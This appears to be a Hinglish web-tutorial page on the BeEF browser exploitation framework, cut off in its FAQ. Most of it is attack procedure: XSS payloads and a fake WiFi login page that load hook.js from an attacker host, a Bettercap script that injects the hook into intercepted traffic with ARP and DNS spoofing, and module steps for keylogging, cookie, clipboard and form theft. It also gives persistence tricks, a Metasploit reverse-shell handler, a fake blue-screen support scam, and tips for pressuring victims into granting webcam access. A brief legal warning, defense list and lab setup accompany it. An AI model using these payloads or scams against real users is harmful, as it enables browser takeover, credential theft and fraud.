import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function BeefXss() {
  return (
    <TutorialLayout
      title="beef-xss"
      subtitle="Browser Exploitation Framework — XSS se browsers ko control karo"
      icon="🥩"
      prev={{ to: '/tool/crunch', label: 'crunch' }}
      next={{ to: '/tool/proxychains', label: 'proxychains' }}
    >
      <h2>What is BeEF?</h2>
      <p>
        BeEF (Browser Exploitation Framework) एक powerful penetration testing tool है जो web browser vulnerabilities को target करता है। यह XSS (Cross-Site Scripting) vulnerabilities का फायदा उठाकर victim के browser में एक JavaScript hook inject करता है। एक बार browser hook हो जाए तो attacker को browser का complete control मिल जाता है — keystrokes capture, webcam access, network scanning, phishing pages दिखाना, cookies चुराना, और बहुत कुछ।
      </p>
      <p>
        BeEF को Wade Alcorn ने बनाया था। यह Ruby में लिखा गया है और web-based dashboard provide करता है जहाँ से सभी hooked browsers manage होते हैं। हर hooked browser को "zombie" कहते हैं — attacker zombie browsers पर commands run करके real-time exploitation कर सकता है। यह tool social engineering attacks में बहुत effective है।
      </p>
      <p>
        BeEF का मतलब है कि XSS सिर्फ alert() popup नहीं है — यह full browser takeover हो सकता है। किसी भी website पर XSS vulnerability हो तो BeEF से victim का पूरा browser compromise हो सकता है। यह web application security testing का सबसे underestimated tool है।
      </p>
      <p>
        BeEF 300+ pre-built command modules provide करता है जो hooked browser पर run कर सकते हैं। Browser fingerprinting, network reconnaissance, social engineering, keylogging, webcam/microphone access, clipboard theft, session hijacking — सब एक ही framework में। Red teamers और penetration testers के लिए यह browser-based attacks का Swiss army knife है।
      </p>
      <p>
        BeEF का architecture event-driven है — Ruby server चलता है attacker machine पर, hook.js victim के browser में inject होता है, और WebSocket connection से real-time C2 (Command & Control) establish होता है। यह Metasploit Framework के साथ भी integrate होता है — browser exploits launch करने के लिए।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> BeEF केवल authorized penetration testing और अपने lab environment में ही use करें। बिना अनुमति के browser exploitation अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized browser access अपराध हो सकता है।
      </div>

      <h2>History of BeEF</h2>
      <p>
        BeEF की शुरुआत 2006 में Wade Alcorn ने की थी। शुरू में यह एक simple XSS exploitation framework था, लेकिन समय के साथ यह browser exploitation का comprehensive tool बन गया। 2010 में इसे Ruby on Rails में rewrite किया गया और web-based dashboard add हुआ।
      </p>
      <p>
        BeEF ने browser security की reality दिखाई — browsers सिर्फ web pages render नहीं करते, यह powerful execution environments हैं। Webcam, microphone, geolocation, clipboard — सब access हो सकता है। BeEF ने security community को browser-based attacks की seriousness समझाई।
      </p>
      <p>
        2012 में BeEF को Kali Linux में include किया गया। आज यह GitHub पर 9,000+ stars के साथ सबसे popular browser exploitation framework है। DEF CON और Black Hat conferences में इसके demonstrations हो चुके हैं। BeEF active development में है और regular updates आते रहते हैं।
      </p>

      <h2>How BeEF Works?</h2>
      <p>
        BeEF का architecture client-server model पर based है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">BeEF Server:</strong> Ruby-based server जो attacker machine पर चलता है (port 3000)</li>
        <li><strong className="text-white">hook.js:</strong> Core JavaScript payload जो victim के browser में inject होता है</li>
        <li><strong className="text-white">Zombie Browser:</strong> Hooked browser जो attacker के commands execute करता है</li>
        <li><strong className="text-white">Command & Control:</strong> Web dashboard जहाँ से सभी zombies manage होते हैं</li>
        <li><strong className="text-white">Command Modules:</strong> Pre-built attack modules (keylogger, phishing, network scan, etc.)</li>
        <li><strong className="text-white">REST API:</strong> Programmatic access — scripts से BeEF control कर सकते हो</li>
        <li><strong className="text-white">WebSocket C2:</strong> Real-time bidirectional communication between server और zombie</li>
        <li><strong className="text-white">Event System:</strong> Browser events (click, keypress, navigation) monitor कर सकते हो</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में BeEF pre-installed आता है। अगर नहीं है तो आसानी से install कर सकते हो।
      </p>
      <CodeBlock
        title="BeEF Installation"
        code={`# Kali में pre-installed:
sudo apt install beef-xss

# Source से install:
git clone https://github.com/beefproject/beef.git
cd beef
gem install bundler
bundle install

# Start BeEF:
sudo beef-xss

# Ya source directory से:
cd /usr/share/beef-xss
sudo ./beef

# Default credentials:
# Username: beef
# Password: beef

# Dashboard URL:
# http://127.0.0.1:3000/ui/panel

# Config file:
# /usr/share/beef-xss/config.yaml

# Docker से install:
docker pull beefproject/beef
docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 beefproject/beef`}
      />

      <h2>Basic Usage</h2>
      <p>
        BeEF start करने के बाद hook.js URL मिलता है जो victim के browser में inject करना होता है।
      </p>
      <CodeBlock
        title="BeEF Basic Workflow"
        code={`# Step 1: BeEF start करें:
sudo beef-xss

# Step 2: Dashboard open करें:
# http://127.0.0.1:3000/ui/panel
# Login: beef / beef

# Step 3: Hook URL note करें:
# http://YOUR_IP:3000/hook.js

# Step 4: Victim के browser में inject करें:
# XSS vulnerability से:
<script src="http://YOUR_IP:3000/hook.js"></script>

# Step 5: Dashboard पर hooked browser दिखेगा
# Commands run करो — browser control में है!

# Online Demo Hook Page बनाओ:
echo '<html>
<head><title>Free WiFi</title></head>
<body>
<h1>WiFi Connected!</h1>
<script src="http://YOUR_IP:3000/hook.js"></script>
</body>
</html>' > /var/www/html/wifi.html`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Config Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">Default</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">host</td><td className="py-2 px-3">BeEF server IP address</td><td className="py-2 px-3">0.0.0.0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">port</td><td className="py-2 px-3">Server port</td><td className="py-2 px-3">3000</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">public_port</td><td className="py-2 px-3">Public-facing port (NAT/proxy)</td><td className="py-2 px-3">same as port</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hook_uri</td><td className="py-2 px-3">Hook script path</td><td className="py-2 px-3">/hook.js</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dns</td><td className="py-2 px-3">DNS server configuration</td><td className="py-2 px-3">null</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">web_ui.user</td><td className="py-2 px-3">Dashboard username</td><td className="py-2 px-3">beef</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">web_ui.pass</td><td className="py-2 px-3">Dashboard password</td><td className="py-2 px-3">beef</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">extension.metasploit</td><td className="py-2 px-3">Metasploit integration enable</td><td className="py-2 px-3">false</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">extension.proxy</td><td className="py-2 px-3">Proxy configuration</td><td className="py-2 px-3">null</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https.enable</td><td className="py-2 px-3">HTTPS mode enable</td><td className="py-2 px-3">false</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https.key</td><td className="py-2 px-3">SSL key file path</td><td className="py-2 px-3">null</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https.cert</td><td className="py-2 px-3">SSL certificate path</td><td className="py-2 px-3">null</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">xss_debug</td><td className="py-2 px-3">XSS debugging mode</td><td className="py-2 px-3">false</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">client_debug</td><td className="py-2 px-3">Client-side debug logs</td><td className="py-2 px-3">false</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">allow_reverse_proxy</td><td className="py-2 px-3">Reverse proxy support</td><td className="py-2 px-3">false</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Hook Injection Methods</h2>
      <p>
        hook.js को victim के browser में inject करने के कई तरीके हैं:
      </p>
      <CodeBlock
        title="Injection Methods"
        code={`# Method 1: XSS Vulnerable Page में inject:
<script src="http://YOUR_IP:3000/hook.js"></script>

# Method 2: Image tag से:
<img src="x" onerror="var s=document.createElement('script');s.src='http://YOUR_IP:3000/hook.js';document.body.appendChild(s)">

# Method 3: SVG onload:
<svg onload="fetch('http://YOUR_IP:3000/hook.js').then(r=>r.text()).then(eval)">

# Method 4: Phishing page बनाओ:
# Fake login page बनाओ जिसमें hook.js include हो
<html>
<head><title>Free WiFi Login</title></head>
<body>
  <h1>WiFi Access के लिए Login करें</h1>
  <form>
    <input type="text" placeholder="Username"><br>
    <input type="password" placeholder="Password"><br>
    <button type="submit">Login</button>
  </form>
  <script src="http://YOUR_IP:3000/hook.js"></script>
</body>
</html>

# Method 5: MITM से inject (Bettercap):
# bettercap -iface wlan0
# set http.proxy.script beef_inject.js
# http.proxy on

# Method 6: DNS Spoof + BeEF:
# DNS spoof करो victim को phishing page पर redirect करो
# जिसमें hook.js embedded हो

# Method 7: QR Code:
# QR code generate करो जो hook page पर redirect करे
# qrencode -o qr.png "http://YOUR_IP:3000/wifi.html"

# Method 8: WiFi Portal (Evil Twin):
# Rogue AP बनाओ → captive portal → hook.js inject

# Method 9: Browser Extension:
# Malicious extension बनाओ जो hook.js load करे
# Chrome Web Store / Firefox Add-ons पर publish (authorized only)

# Method 10: Ad Injection:
# MITM से HTTP pages में ad slots में hook.js inject`}
      />

      <h2>Command Modules</h2>
      <p>
        BeEF में 300+ pre-built command modules हैं जो hooked browser पर run कर सकते हो:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Category</th>
              <th className="text-left py-2 px-3 text-neon-green">Modules</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Browser</td><td className="py-2 px-3 font-mono">Get Fingerprint, Get Plugins, Detect OS</td><td className="py-2 px-3">Browser details, installed plugins</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Host</td><td className="py-2 px-3 font-mono">Get Internal IP, Get Clipboard, Get Storage</td><td className="py-2 px-3">System info, clipboard data, localStorage</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Network</td><td className="py-2 px-3 font-mono">Port Scan, DNS Discovery, Gateway Detect</td><td className="py-2 px-3">Internal network scanning from browser</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Social Eng.</td><td className="py-2 px-3 font-mono">Pretty Theft, Fake Notification, Clickjack</td><td className="py-2 px-3">Fake login dialogs, phishing, clickjacking</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Logging</td><td className="py-2 px-3 font-mono">Keylogger, Mouse Logger, Form Logger</td><td className="py-2 px-3">Input capture — keystrokes, mouse, forms</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Media</td><td className="py-2 px-3 font-mono">Webcam, Microphone, Screen Capture</td><td className="py-2 px-3">Camera/mic access, screenshot (with permission)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Persistence</td><td className="py-2 px-3 font-mono">Create Popunder, Confirm Close, iFrame</td><td className="py-2 px-3">Browser में बने रहो — tab close पर भी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Exploits</td><td className="py-2 px-3 font-mono">Metasploit modules, Browser exploits</td><td className="py-2 px-3">Known vulnerabilities exploit करो</td></tr>
            <tr><td className="py-2 px-3 text-white">Rider</td><td className="py-2 px-3 font-mono">Request Rider, Response Rider</td><td className="py-2 px-3">HTTP traffic intercept और modify</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Browser Fingerprinting</h2>
      <p>
        Hooked browser से detailed information extract कर सकते हो:
      </p>
      <CodeBlock
        title="Fingerprinting Commands"
        code={`# Dashboard से: Commands → Browser → Get Fingerprint

# यह information मिलती है:
# - Browser name और version
# - Operating system और version
# - Installed plugins (Flash, Java, PDF reader, etc.)
# - Screen resolution और color depth
# - Language settings और timezone
# - User Agent string
# - Cookie support
# - JavaScript version
# - WebGL capabilities और GPU info
# - Battery status (mobile devices)
# - Hardware concurrency (CPU cores)
# - Device memory (RAM)
# - Touch support (mobile/tablet)
# - Installed fonts (fingerprint uniqueness)
# - Canvas fingerprint

# Plugin detection:
# Commands → Browser → Detect Plugins
# Flash, Java, QuickTime, Silverlight — सब detect होता है

# Extension detection:
# Commands → Browser → Detect Extensions
# Installed browser extensions detect कर सकते हो`}
      />

      <h2>Network Reconnaissance</h2>
      <p>
        Victim के browser से internal network scan कर सकते हो — यह बहुत powerful है:
      </p>
      <CodeBlock
        title="Network Discovery"
        code={`# Internal IP detect:
# Commands → Host → Get Internal IP
# victim का local IP address मिलता है (WebRTC से)

# Network scan:
# Commands → Network → Discover LAN Servers
# Victim के local network में servers detect होते हैं

# Port scan:
# Commands → Network → Port Scanner
# Common ports scan करो (80, 443, 8080, 22, 21, 3306, 5432)

# Gateway detect:
# Commands → Network → Detect Gateway
# Default gateway IP मिलता है

# DNS enumeration:
# Commands → Network → DNS Query
# Internal DNS records resolve कर सकते हो

# WebRTC leak:
# Commands → Browser → WebRTC IP
# Real IP address leak हो सकता है VPN के पीछे भी

# CORS bypass scan:
# Commands → Network → CORS Detection
# CORS misconfigurations detect करो

# Local network web servers:
# Commands → Network → Discover LAN Servers
# 192.168.x.x range में HTTP servers ढूंढो`}
      />

      <h2>Social Engineering Attacks</h2>
      <p>
        BeEF का सबसे powerful feature social engineering है:
      </p>
      <CodeBlock
        title="Social Engineering Modules"
        code={`# Fake Login Dialog:
# Commands → Social Engineering → Pretty Theft
# Gmail, Facebook, Twitter, LinkedIn — सबका fake login
# Victim सोचता है session expire हुआ, credentials enter करता है

# Fake Notification:
# Commands → Social Engineering → Chrome Extensions
# "Chrome Update Required" notification
# Victim fake update download करता है

# Fake Flash Update:
# Commands → Social Engineering → Fake Flash Update
# "Flash Player Update Required" dialog
# Malware download होता है

# Clickjacking:
# Commands → Social Engineering → Clickjack
# Invisible iframe से victim को trick करो

# Tab Nabbing:
# Commands → Social Engineering → Tabnabbing
# Inactive tab का content change करो
# Victim tab switch करे तो fake page दिखे

# Fake Notification Bar:
# Commands → Social Engineering → Notification
# Browser notification bar mimic करो
# "Your computer is infected!" warning

# Fake BSOD:
# Commands → Social Engineering → Fake BSOD
# Blue Screen of Death दिखाओ
# Victim panic करेगा "support number" call करेगा

# Clippy (Microsoft Office Assistant):
# Commands → Social Engineering → Clippy
# "Your computer may be at risk!" popup`}
      />

      <h2>Keylogger and Data Theft</h2>
      <CodeBlock
        title="Data Capture"
        code={`# Keylogger start:
# Commands → Logging → Keylogger
# सारे keystrokes capture होते हैं
# Passwords, search queries, messages — सब

# Cookie steal:
# Commands → Host → Get Cookie
# Session cookies मिलते हैं
# Session hijacking possible

# Clipboard read:
# Commands → Host → Get Clipboard
# Copy किया हुआ data read करो
# Passwords, credit card numbers

# Local Storage:
# Commands → Host → Get Local Storage
# Web app data stored होता है

# Session Storage:
# Commands → Host → Get Session Storage
# Current session data

# History:
# Commands → Browser → Get History
# Victim की browsing history

# Forms capture:
# Commands → Logging → Form Logger
# सारे form submissions capture होते हैं
# Login forms, payment forms, search forms

# Mouse tracking:
# Commands → Logging → Mouse Logger
# Mouse movements और clicks track करो
# User behavior analysis के लिए`}
      />

      <h2>Persistence Techniques</h2>
      <p>
        Victim के browser में बने रहने के लिए persistence techniques use करो:
      </p>
      <CodeBlock
        title="Persistence Methods"
        code={`# Popunder window:
# Commands → Persistence → Create Popunder
# Background में hidden window open होता है
# Victim tab close करे तो भी hook active रहता है

# Confirm dialog on close:
# Commands → Persistence → Confirm Close Tab
# "Are you sure you want to leave?" dialog
# Victim को रोकता है

# iFrame persistence:
# Commands → Persistence → iFrame Invisible
# Invisible iframe में hook load रहता है

# Cookie persistence:
# Commands → Persistence → Set Cookie
# Hook information cookie में store होती है
# Page reload पर भी hook re-establish होता है

# Man-in-the-Browser:
# Commands → Persistence → MitB
# Browser के अंदर persistent agent
# हर page load पर hook automatically inject

# Web Worker persistence:
# Commands → Persistence → Web Worker
# Background process में hook run होता है
# Tab close करने पर भी terminate नहीं होता

# Service Worker persistence:
# Commands → Persistence → Service Worker
# Browser-level persistent hook
# बहुत difficult to detect और remove`}
      />

      <h2>Metasploit Integration</h2>
      <p>
        BeEF को Metasploit के साथ combine कर सकते हो — browser exploits launch करने के लिए:
      </p>
      <CodeBlock
        title="BeEF + Metasploit"
        code={`# Config file edit करें:
# /usr/share/beef-xss/config.yaml
# extension:
#   metasploit:
#     enable: true

# Metasploit handler start:
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit -j

# Browser exploits:
use exploit/multi/browser/firefox_pdfjs_privilege_escalation
use exploit/multi/browser/adobe_flash_hacking_team_uaf

# BeEF से Metasploit exploit launch:
# Commands → Metasploit → Select exploit
# Victim के browser पर exploit run होगा
# Meterpreter session open होगा

# Auto-pwn:
# Commands → Metasploit → Auto-Pwn
# Browser version detect करके suitable exploit automatically select
# Best match exploit launch होता है`}
      />

      <h2>BeEF + Bettercap Combo</h2>
      <CodeBlock
        title="Network-wide BeEF Injection"
        code={`# Bettercap से network traffic में hook.js inject:

# Step 1: BeEF start करो
sudo beef-xss

# Step 2: Bettercap inject script बनाओ
cat > beef_inject.js << 'EOF'
function onRequest(req, res) {
  if (req.ContentType.indexOf('text/html') === 0) {
    var body = res.ReadBody();
    body = body.replace('</head>',
      '<script src="http://ATTACKER_IP:3000/hook.js"></script></head>');
    res.Body = body;
  }
}
EOF

# Step 3: Bettercap start करो
sudo bettercap -iface wlan0
set http.proxy.script beef_inject.js
http.proxy on
arp.spoof on

# Step 4: Victim कोई भी HTTP page open करे
# hook.js automatically inject होगा
# BeEF dashboard पर zombie दिखेगा

# DNS spoof combination:
# bettercap में:
# set dns.spoof.domains target.com
# set dns.spoof.address ATTACKER_IP
# dns.spoof on
# अब target.com पर जाने पर phishing page दिखेगा`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        BeEF real-world penetration tests और red team operations में बहुत effectively इस्तेमाल होता है। यहाँ कुछ practical scenarios हैं जहाँ BeEF critical role play करता है।
      </p>
      <p>
        एक common scenario है corporate WiFi captive portal attack। Attacker rogue access point बनाता है (Evil Twin) जो company WiFi जैसा दिखता है। Captive portal page में hook.js embed होता है। जब employees connect करते हैं और "WiFi login" page देखते हैं, उनके browsers hook हो जाते हैं। Attacker अब internal network access कर सकता है, credentials capture कर सकता है, और lateral movement कर सकता है।
      </p>
      <p>
        एक और scenario है XSS-based data exfiltration। किसी web application में stored XSS vulnerability मिलती है। Attacker comment field में hook.js inject करता है। जब admin panel में comments review करता है, admin का browser hook हो जाता है। Admin privileges के साथ attacker database access, user management, और system configuration change कर सकता है।
      </p>
      <p>
        Bug bounty programs में भी BeEF useful है। XSS vulnerability demonstrate करने के लिए BeEF hook से better proof-of-concept नहीं होता। Browser fingerprinting, cookie theft, keylogging — सब live demo हो जाता है। Bug bounty triagers को impact clearly दिखता है और reward amount बढ़ता है।
      </p>

      <h2>Performance Tuning</h2>
      <p>
        BeEF को efficiently चलाने के लिए कुछ performance optimization techniques हैं। बड़े scale operations में (100+ zombies) performance tuning ज़रूरी है।
      </p>
      <CodeBlock
        title="BeEF Performance Optimization"
        code={`# config.yaml में debug mode off करो:
# production:
#   debug: false
#   client_debug: false

# Ruby threads increase करो:
# server:
#   threaded: true

# Database optimization (CE में):
# PostgreSQL connection pool बढ़ाओ
# Redis caching enable करो

# Network optimization:
# WebSocket heartbeat interval adjust करो
# Default: 1 second → 5 seconds for large deployments

# Memory management:
# Unused zombie cleanup interval set करो
# Zombie timeout: 5 minutes (configurable)

# Reverse proxy setup (Nginx):
# upstream beef {
#     server 127.0.0.1:3000;
# }
# server {
#     listen 80;
#     location / {
#         proxy_pass http://beef;
#         proxy_http_version 1.1;
#         proxy_set_header Upgrade $http_upgrade;
#         proxy_set_header Connection "upgrade";
#     }
# }`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        BeEF session data को analyze और report करना red team engagements में ज़रूरी है। BeEF REST API से automated reporting possible है।
      </p>
      <CodeBlock
        title="BeEF Reporting"
        code={`# REST API से hooked browsers data export:
# Token get करो:
TOKEN=$(curl -s http://localhost:3000/api/admin/login \\
  -d '{"username":"beef","password":"beef"}' | jq -r '.token')

# सभी hooked browsers list:
curl -s http://localhost:3000/api/hooks \\
  -H "Authorization: Bearer $TOKEN" | jq .

# Browser details export:
curl -s http://localhost:3000/api/hooks/1 \\
  -H "Authorization: Bearer $TOKEN" | jq .

# Command results export:
curl -s http://localhost:3000/api/hooks/1/commands \\
  -H "Authorization: Bearer $TOKEN" | jq .

# CSV report generate:
curl -s http://localhost:3000/api/hooks \\
  -H "Authorization: Bearer $TOKEN" | \\
  jq -r '.[] | [.ip, .browser, .os] | @csv' > report.csv

# JSON report:
curl -s http://localhost:3000/api/hooks \\
  -H "Authorization: Bearer $TOKEN" > beef_report.json`}
      />

      <h2>BeEF vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">BeEF</th>
              <th className="text-left py-2 px-3 text-neon-green">Evilginx2</th>
              <th className="text-left py-2 px-3 text-neon-green">SET</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Focus</td><td className="py-2 px-3">Browser exploitation</td><td className="py-2 px-3">Phishing proxy</td><td className="py-2 px-3">Social engineering toolkit</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">XSS Based</td><td className="py-2 px-3">हाँ (hook.js)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">सीमित</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Live Control</td><td className="py-2 px-3">हाँ (real-time C2)</td><td className="py-2 px-3">नहीं (proxy only)</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Network Scan</td><td className="py-2 px-3">हाँ (victim network)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">2FA Bypass</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (AitM)</td><td className="py-2 px-3">सीमित</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Keylogger</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Webcam/Mic</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Module Count</td><td className="py-2 px-3">300+</td><td className="py-2 px-3">Phishing templates</td><td className="py-2 px-3">Multiple attack vectors</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Language</td><td className="py-2 px-3">Ruby</td><td className="py-2 px-3">Go</td><td className="py-2 px-3">Python</td></tr>
            <tr><td className="py-2 px-3 text-white">Metasploit Integration</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'BeEF start नहीं हो रहा', a: 'Ruby version check करो (2.5+ चाहिए)। Dependencies install करो: bundle install। Port 3000 free होना चाहिए — lsof -i :3000 check करो। Permission error पर sudo use करो।' },
          { q: 'Hook.js inject करने पर browser block कर रहा है', a: 'CSP (Content Security Policy) block कर रहा है। XSS vulnerability वाली site पर try करो। HTTP headers check करो — X-Frame-Options, CSP headers। Inline script bypass techniques use करो।' },
          { q: 'HTTPS site पर hook काम नहीं कर रहा', a: 'Mixed content block होता है — HTTP hook.js HTTPS page पर load नहीं होगा। BeEF को HTTPS setup करो (SSL certificate configure करो config.yaml में)। Bettercap MITM से inject करो।' },
          { q: 'Hooked browser disconnect हो रहा है', a: 'Victim page close कर रहा है। Persistence modules use करो — popunder, confirm close, web worker। WebSocket connection check करो। Network stability check करो।' },
          { q: 'Network scan काम नहीं कर रहा', a: 'Browser CORS restrictions block करते हैं। WebRTC-based methods try करो। Victim का browser modern होना चाहिए। Chrome latest versions restrict internal network access।' },
          { q: 'Webcam access नहीं हो रहा', a: 'Browser permission prompt आता है victim को allow करना होगा। Social engineering से permission convince करो। HTTPS required है Chrome में — localhost exception try करो।' },
          { q: 'Multiple victims manage करने में problem', a: 'Dashboard में zombie list use करो — filter और sort कर सकते हो। REST API से bulk commands execute करो। Command groups use करो — multiple zombies पर एक साथ command।' },
          { q: 'BeEF bahut slow है', a: 'Config में debug mode off करो। Unnecessary extensions disable करो। Server resources check करो (RAM, CPU)। Network latency check करो — VPN/remote server से slow हो सकता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        BeEF attacks से कैसे बचें (defensive perspective):
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Content Security Policy (CSP):</strong> External scripts block होंगे — script-src 'self' implement करो</li>
        <li><strong className="text-white">XSS Prevention:</strong> Input validation, output encoding — XSS vulnerabilities fix करो (DOMPurify, React auto-escaping)</li>
        <li><strong className="text-white">hook.js Detection:</strong> Network monitoring से /hook.js requests detect करो (IDS rules, proxy logs)</li>
        <li><strong className="text-white">Browser Extensions:</strong> NoScript, uBlock Origin — unauthorized scripts block होंगे</li>
        <li><strong className="text-white">HTTP Headers:</strong> X-XSS-Protection: 1, X-Content-Type-Options: nosniff, X-Frame-Options: DENY set करो</li>
        <li><strong className="text-white">Network Monitoring:</strong> Outbound connections to unknown IPs monitor करो (SIEM alerts)</li>
        <li><strong className="text-white">Regular Updates:</strong> Browser और plugins updated रखो — known exploits patch होंगे</li>
        <li><strong className="text-white">Web Application Firewall:</strong> WAF XSS payloads block करता है (ModSecurity, AWS WAF)</li>
        <li><strong className="text-white">Subresource Integrity (SRI):</strong> External scripts की integrity verify करो — tampered scripts load नहीं होंगे</li>
        <li><strong className="text-white">Websocket Monitoring:</strong> Unusual WebSocket connections detect करो — BeEF C2 traffic pattern</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        BeEF practice के लिए safe lab बनाओ:
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# Virtual machines:
# - Kali Linux (attacker — BeEF run करो)
# - Windows/Ubuntu VM (victim — browser)
# - DVWA server (XSS vulnerable app)

# DVWA setup:
sudo apt install dvwa
# XSS reflected page पर hook.js inject करो

# Network setup:
# Host-only adapter use करो
# Attacker: 192.168.56.10
# Victim: 192.168.56.20

# BeEF start:
sudo beef-xss
# Dashboard: http://192.168.56.10:3000/ui/panel

# Test injection:
# DVWA XSS page पर:
<script src="http://192.168.56.10:3000/hook.js"></script>

# Victim browser में DVWA open करो
# BeEF dashboard पर hooked browser दिखेगा

# Practice targets:
# - DVWA (Damn Vulnerable Web Application)
# - XSS-game.appspot.com (Google XSS Game)
# - bWAPP (buggy Web Application)
# - HackTheBox web challenges
# - TryHackMe web rooms`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced BeEF Usage"
        code={`# REST API से BeEF control:
# Token get करो:
curl -s http://localhost:3000/api/admin/login \\
  -d '{"username":"beef","password":"beef"}'

# Hooked browsers list:
curl -s http://localhost:3000/api/hooks \\
  -H "Content-Type: application/json" \\
  -H "Authorization: Bearer TOKEN"

# Command execute:
curl -s http://localhost:3000/api/hooks/1/commands \\
  -d '{"id":"get_fingerprint"}'

# Custom module बनाओ:
# /usr/share/beef-xss/modules/custom/my_module/module.rb
# /usr/share/beef-xss/modules/custom/my_module/command.js

# Tunneling:
# BeEF + SSH tunnel — remote access
ssh -L 3000:localhost:3000 user@beef-server

# HTTPS setup:
# config.yaml में:
# https:
#   enable: true
#   key: "path/to/key.pem"
#   cert: "path/to/cert.pem"

# Chained attack — BeEF + Metasploit + Social Engineering:
# 1. BeEF से browser fingerprint निकालो
# 2. Vulnerable plugin detect करो
# 3. Metasploit exploit launch करो
# 4. Meterpreter session प्राप्त करो
# 5. System-level access

# Browser pivot attack:
# Commands → Network → Request Rider
# Victim के authenticated session use करो
# उसकी identity से internal web apps access करो`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या BeEF free है?', a: 'हाँ, BeEF open source (GPLv2) है और free में use कर सकते हो। Kali में pre-installed आता है।' },
